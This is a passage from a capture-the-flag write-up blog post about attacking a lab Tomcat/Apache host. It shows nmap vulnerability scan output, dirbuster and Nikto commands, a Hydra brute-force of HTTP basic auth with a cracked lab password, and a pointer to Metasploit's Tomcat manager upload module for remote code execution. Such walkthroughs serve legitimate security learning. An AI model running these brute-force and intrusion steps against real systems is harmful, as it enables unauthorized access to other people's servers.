|     	MSF:ILITIES/APACHE-HTTPD-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/AMAZON_LINUX-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/	6.8	https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/	*EXPLOIT*
|     	MSF:ILITIES/ALPINE-LINUX-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2017-15715/	*EXPLOIT*
|     	FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8	6.8	https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8	*EXPLOIT*
|     	CVE-2021-40438	6.8	https://vulners.com/cve/CVE-2021-40438
|     	CVE-2020-35452	6.8	https://vulners.com/cve/CVE-2020-35452
|     	CVE-2018-1312	6.8	https://vulners.com/cve/CVE-2018-1312
|     	CVE-2017-15715	6.8	https://vulners.com/cve/CVE-2017-15715
|     	4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332	6.8	https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332	*EXPLOIT*
|     	CVE-2021-44224	6.4	https://vulners.com/cve/CVE-2021-44224
|     	CVE-2019-10082	6.4	https://vulners.com/cve/CVE-2019-10082
|     	CVE-2017-9788	6.4	https://vulners.com/cve/CVE-2017-9788
|     	MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/	6.0	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/	*EXPLOIT*
|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/	6.0	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/	*EXPLOIT*
|     	CVE-2019-0217	6.0	https://vulners.com/cve/CVE-2019-0217
|     	CVE-2020-1927	5.8	https://vulners.com/cve/CVE-2020-1927
|     	CVE-2019-10098	5.8	https://vulners.com/cve/CVE-2019-10098
|     	1337DAY-ID-33577	5.8	https://vulners.com/zdt/1337DAY-ID-33577	*EXPLOIT*
|     	CVE-2016-5387	5.1	https://vulners.com/cve/CVE-2016-5387
|     	SSV:96537	5.0	https://vulners.com/seebug/SSV:96537	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2018-1333/	5.0	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1333/	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2018-1303/	5.0	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1303/	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15710/	*EXPLOIT*
|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/	5.0	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/	*EXPLOIT*
|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15710/	*EXPLOIT*
|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15710/	*EXPLOIT*
|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-8743/	5.0	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-8743/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15710/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15710/	*EXPLOIT*
|     	MSF:ILITIES/CENTOS_LINUX-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2017-15710/	*EXPLOIT*
|     	MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED	5.0	https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED	*EXPLOIT*
|     	EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D	5.0	https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D	*EXPLOIT*
|     	EXPLOITPACK:2666FB0676B4B582D689921651A30355	5.0	https://vulners.com/exploitpack/EXPLOITPACK:2666FB0676B4B582D689921651A30355	*EXPLOIT*
|     	EDB-ID:42745	5.0	https://vulners.com/exploitdb/EDB-ID:42745	*EXPLOIT*
|     	EDB-ID:40909	5.0	https://vulners.com/exploitdb/EDB-ID:40909	*EXPLOIT*
|     	CVE-2021-34798	5.0	https://vulners.com/cve/CVE-2021-34798
|     	CVE-2021-33193	5.0	https://vulners.com/cve/CVE-2021-33193
|     	CVE-2021-26690	5.0	https://vulners.com/cve/CVE-2021-26690
|     	CVE-2020-1934	5.0	https://vulners.com/cve/CVE-2020-1934
|     	CVE-2019-17567	5.0	https://vulners.com/cve/CVE-2019-17567
|     	CVE-2019-0220	5.0	https://vulners.com/cve/CVE-2019-0220
|     	CVE-2019-0196	5.0	https://vulners.com/cve/CVE-2019-0196
|     	CVE-2018-17199	5.0	https://vulners.com/cve/CVE-2018-17199
|     	CVE-2018-17189	5.0	https://vulners.com/cve/CVE-2018-17189
|     	CVE-2018-1333	5.0	https://vulners.com/cve/CVE-2018-1333
|     	CVE-2018-1303	5.0	https://vulners.com/cve/CVE-2018-1303
|     	CVE-2017-9798	5.0	https://vulners.com/cve/CVE-2017-9798
|     	CVE-2017-15710	5.0	https://vulners.com/cve/CVE-2017-15710
|     	CVE-2016-8743	5.0	https://vulners.com/cve/CVE-2016-8743
|     	CVE-2016-8740	5.0	https://vulners.com/cve/CVE-2016-8740
|     	CVE-2016-4979	5.0	https://vulners.com/cve/CVE-2016-4979
|     	1337DAY-ID-28573	5.0	https://vulners.com/zdt/1337DAY-ID-28573	*EXPLOIT*
|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-0197/	4.9	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-0197/	*EXPLOIT*
|     	CVE-2019-0197	4.9	https://vulners.com/cve/CVE-2019-0197
|     	MSF:ILITIES/UBUNTU-CVE-2018-1302/	4.3	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1302/	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2018-1301/	4.3	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1301/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2016-4975/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2016-4975/	*EXPLOIT*
|     	MSF:ILITIES/DEBIAN-CVE-2019-10092/	4.3	https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-10092/	*EXPLOIT*
|     	MSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/	4.3	https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/	*EXPLOIT*
|     	MSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/	4.3	https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/	*EXPLOIT*
|     	CVE-2020-11985	4.3	https://vulners.com/cve/CVE-2020-11985
|     	CVE-2019-10092	4.3	https://vulners.com/cve/CVE-2019-10092
|     	CVE-2018-1302	4.3	https://vulners.com/cve/CVE-2018-1302
|     	CVE-2018-1301	4.3	https://vulners.com/cve/CVE-2018-1301
|     	CVE-2018-11763	4.3	https://vulners.com/cve/CVE-2018-11763
|     	CVE-2016-4975	4.3	https://vulners.com/cve/CVE-2016-4975
|     	CVE-2016-1546	4.3	https://vulners.com/cve/CVE-2016-1546
|     	4013EC74-B3C1-5D95-938A-54197A58586D	4.3	https://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D	*EXPLOIT*
|     	1337DAY-ID-33575	4.3	https://vulners.com/zdt/1337DAY-ID-33575	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1283/	*EXPLOIT*
|     	MSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/	*EXPLOIT*
|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2018-1283/	*EXPLOIT*
|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2018-1283/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1283/	*EXPLOIT*
|     	MSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/	*EXPLOIT*
|     	CVE-2018-1283	3.5	https://vulners.com/cve/CVE-2018-1283
|     	CVE-2016-8612	3.3	https://vulners.com/cve/CVE-2016-8612
|     	PACKETSTORM:152441	0.0	https://vulners.com/packetstorm/PACKETSTORM:152441	*EXPLOIT*
|_    	MSF:EXPLOIT/UNIX/WEBAPP/JOOMLA_MEDIA_UPLOAD_EXEC/	0.0	https://vulners.com/metasploit/MSF:EXPLOIT/UNIX/WEBAPP/JOOMLA_MEDIA_UPLOAD_EXEC/	*EXPLOIT*
|_http-dombased-xss: Couldn&#039;t find any DOM based XSS.
1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-csrf: Couldn&#039;t find any CSRF vulnerabilities.
| http-enum: 
|   /examples/: Sample scripts
|   /manager/html/upload: Apache Tomcat (401 Unauthorized)
|   /manager/html: Apache Tomcat (401 Unauthorized)
|_  /docs/: Potentially interesting folder
|_http-stored-xss: Couldn&#039;t find any stored XSS vulnerabilities.
|_http-server-header: Apache-Coyote/1.1
|_http-dombased-xss: Couldn&#039;t find any DOM based XSS.
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=1/30%OT=22%CT=1%CU=32123%PV=Y%DS=4%DC=T%G=Y%TM=61F71BC
OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10F%TI=Z%TS=8)SEQ(SP=104%GC
OS:D=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)OPS(O1=M506ST11NW7%O2=M506ST11NW7%O3=M50
OS:6NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M506ST11)WIN(W1=68DF%W2=68DF%
OS:W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M506NNSNW7%CC
OS:=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T
OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
OS:0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=
OS:Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=
OS:G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.019 days (since Sun Jan 30 15:47:12 2022)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   29.74 ms  10.13.0.1
2   ... 3
4   171.05 ms 10.10.28.154

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 30 16:14:13 2022 -- 1 IP address (1 host up) scanned in 1300.33 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;So, we’ve got the following ports:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;22: OpenSSH (&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/nmap&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/nmap&quot;&gt;Nmap&lt;/a&gt; says it’s 7.2p2, but connecting to it directly reveals it to be 8.7p1)&lt;/li&gt;
&lt;li&gt;80: Apache httpd 2.4.18&lt;/li&gt;
&lt;li&gt;1234: Apache Tomcat + Coyote 1.1&lt;/li&gt;
&lt;li&gt;8009: Apache Jserv 1.3&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;There’s a hidden /protected/ directory on port 80 that seems to be password-protected.&lt;/p&gt;
&lt;p&gt;No obvious exploits here.&lt;/p&gt;
&lt;p&gt;We’ll also run a scan with dirbuster (normally I use &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/gobuster&quot; class=&quot;internal&quot; data-slug=&quot;spells/gobuster&quot;&gt;gobuster&lt;/a&gt;, but I’m trying to operate in the spirit of this CTF):&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;dirbuster&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;	-l&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;	-u&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; http://10.10.28.154&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;This finds the following directories:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;/icons/&lt;/li&gt;
&lt;li&gt;/icons/small/&lt;/li&gt;
&lt;li&gt;/guidelines/&lt;/li&gt;
&lt;li&gt;/protected/&lt;/li&gt;
&lt;li&gt;/server-status/&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Going to &lt;code&gt;http://10.10.28.154/guidelines/&lt;/code&gt; reveals a single message:&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;html&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;html&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;Hey &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;&amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;b&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;&gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;bob&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;&amp;#x3C;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;b&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;&gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;, did you update that TomCat server?&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;So, that kinda does imply that Tomcat or Coyote might be vulnerable, even though I couldn’t find anything obvious on &lt;a href=&quot;https://www.exploit-db.com&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Exploit DB&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;. I’ll come back to that.&lt;/p&gt;
&lt;p&gt;We’ll deploy &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/hydra&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/hydra&quot;&gt;Hydra&lt;/a&gt; against the http-basic authentication protecting /protected/. I’ve never done this before, but a quick internet search reveals &lt;a href=&quot;http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;a potentially useful guide&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;, as well as &lt;a href=&quot;https://www.hackingarticles.in/multiple-ways-to-exploiting-http-authentication/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;an additional walk-through&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; clarifying how to use &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/hydra&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/hydra&quot;&gt;Hydra&lt;/a&gt; to crack Apache conf-based http-basic authentication. With this information in hand, we should (hopefully) be able to crack Bob’s password using the following:&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;hydra&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -l&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; bob&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;      -P&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; ~/.local/share/red-team/wordlists/rockyou.txt&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;      -f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -vV&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; http-get://10.10.28.154/protected/&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;I’m kinda curious what’s in /protected/. Unfortunately, the experience is kinda anti-climatic.&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;html&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;html&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;&amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B31D28;--shiki-dark:#B31D28;--shiki-light-font-style:italic;--shiki-dark-font-style:italic&quot;&gt;center&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;&gt;&amp;#x3C;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B31D28;--shiki-dark:#B31D28&quot;&gt;br&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;&gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt; &amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;img&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#B07D48&quot;&gt; width&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt;150&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#B07D48&quot;&gt; src&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#B5695977&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt;protected.png&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#B5695977&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;&gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt; &amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;p&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;&gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;This protected page has now moved to a different port.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;&amp;#x3C;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;p&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;&gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt; &amp;#x3C;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B31D28;--shiki-dark:#B31D28;--shiki-light-font-style:italic;--shiki-dark-font-style:italic&quot;&gt;center&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;Oh well.&lt;/p&gt;
&lt;p&gt;The CTF does direct us to look at &lt;code&gt;http://10.10.28.154:1234/manager/html&lt;/code&gt; (using Bob’s password); that’s just the Tomcat documentation by the looks of it. But if we throw &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/nikto&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/nikto&quot;&gt;Nikto&lt;/a&gt; against it, we can get ourselves another flag.&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;nikto&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -Format&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; txt&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;      -host&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; http://10.10.28.154:1234/manager/html&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;      -id&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; bob:bubbles&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -nossl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -output&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; tools-r-us.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;At this point we’ve got all but two flags. The text for these imply that we can get RCE on this version of Tomcat. It looks like Apache Tomcat 7.0.88 was released on May 16, 2018. &lt;a href=&quot;https://tomcat.apache.org/security-7.html&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;There’s no obvious &lt;em&gt;vulnerability&lt;/em&gt; to exploit for this version&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;, but after searching around a bit on the net I found &lt;a href=&quot;https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;a guide mentioning that RCE on Tomcat could be obtained via the “manager” application&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;. And, indeed, looking at the info for the corresponding module in &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/metasploit&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/metasploit&quot;&gt;Metasploit&lt;/a&gt; (&lt;code&gt;exploit/multi/http/tomcat_mgr_upload&lt;/code&gt;) reveals that we can obtain RCE if we have access to the /manager/html/upload component. Which we &lt;em&gt;do&lt;/em&gt;, because /manager/html has the option to 